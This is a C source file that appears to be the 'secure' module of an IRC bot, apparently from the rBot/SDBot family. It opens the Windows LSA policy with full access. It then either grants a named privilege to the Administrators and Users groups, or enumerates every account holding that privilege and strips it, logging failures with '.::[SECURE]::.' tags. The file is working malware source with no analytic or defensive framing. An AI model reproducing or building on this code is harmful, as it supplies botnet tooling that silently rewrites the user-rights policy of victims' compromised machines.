#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_LSARESTRICT

LPWSTR AccountName[]={
	L"Administrators",
	L"Users"
};

void InitLsaString(PLSA_UNICODE_STRING LsaString, LPWSTR String)
{
	DWORD StringLength;

	if (String == NULL) {
		LsaString->Buffer = NULL;
		LsaString->Length = 0;
		LsaString->MaximumLength = 0;

		return;
	}

	StringLength = wcslen(String);
	LsaString->Buffer = String;
	LsaString->Length = (USHORT) StringLength * sizeof(WCHAR);
	LsaString->MaximumLength=(USHORT)(StringLength+1) * sizeof(WCHAR);

	return;
}

NTSTATUS SetPrivilegeOnAccount(LSA_HANDLE PolicyHandle, PSID AccountSid, LPWSTR PrivilegeName, BOOL bEnable)
{
	LSA_UNICODE_STRING PrivilegeString;
	InitLsaString(&PrivilegeString, PrivilegeName);

	return (bEnable)?(fLsaAddAccountRights(PolicyHandle,AccountSid,&PrivilegeString,1))
		:(fLsaRemoveAccountRights(PolicyHandle,AccountSid,FALSE,&PrivilegeString,1));
}

DWORD AddPrivilegeToAccount(LSA_HANDLE PolicyHandle, LPWSTR AccountName, LPWSTR PrivilegeName)
{
	DWORD total = 0;
	PLSA_TRANSLATED_SID2 ltsTranslatedSID2;
	PLSA_REFERENCED_DOMAIN_LIST lrdlDomainList;
	NTSTATUS ntsResult;

	LSA_UNICODE_STRING lucName;
	InitLsaString(&lucName, AccountName);

	if ((ntsResult = fLsaLookupNames2(PolicyHandle,0,1,&lucName,&lrdlDomainList,&ltsTranslatedSID2)) == ERROR_SUCCESS) {
		if (SetPrivilegeOnAccount(PolicyHandle,ltsTranslatedSID2->Sid,PrivilegeName, TRUE) == ERROR_SUCCESS)
			total++;
	}
	fLsaFreeMemory(ltsTranslatedSID2);
	fLsaFreeMemory(lrdlDomainList);

	return (total);
}

DWORD SearchForPrivilegedAccounts(LPWSTR PrivilegeName, BOOL bEnable)
{
	DWORD count = 0, total = 0;

	static SECURITY_QUALITY_OF_SERVICE sqos = {sizeof SECURITY_QUALITY_OF_SERVICE, SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE};
	static LSA_OBJECT_ATTRIBUTES lsaOA = {sizeof LSA_OBJECT_ATTRIBUTES, NULL, NULL, 0, NULL, &sqos};

	LSA_HANDLE PolicyHandle;
	NTSTATUS nts;
		
	if ((nts = fLsaOpenPolicy(NULL, &lsaOA, GENERIC_ALL | POLICY_VIEW_LOCAL_INFORMATION | POLICY_LOOKUP_NAMES, &PolicyHandle)) == ERROR_SUCCESS) {

		if (bEnable) {
			for (DWORD i=0; i < sizeof(AccountName) / sizeof(LPWSTR); i++)
				total += AddPrivilegeToAccount(PolicyHandle, AccountName[i],PrivilegeName);
		} else {
			void *buffer;

			LSA_UNICODE_STRING PrivilegeString;
			InitLsaString(&PrivilegeString, PrivilegeName);

			if ((nts = fLsaEnumerateAccountsWithUserRight(PolicyHandle, &PrivilegeString, &buffer, &count)) == ERROR_SUCCESS) {
				SID **psidArray = (SID **)buffer;
				for (DWORD i = 0; i < count; ++ i) {
					if (SetPrivilegeOnAccount(PolicyHandle, psidArray[i], PrivilegeName, FALSE) == ERROR_SUCCESS)
						total++;
				}

				if (buffer) fLsaFreeMemory(buffer);
				buffer = NULL;
			} else
				addlog(".::[SECURE]::. Failed to enumerate LSA accounts.");
		}

		fLsaClose(PolicyHandle);
	} else
		addlog(".::[SECURE]::. Failed to open LSA system policy.");

	return (total);
}
#endif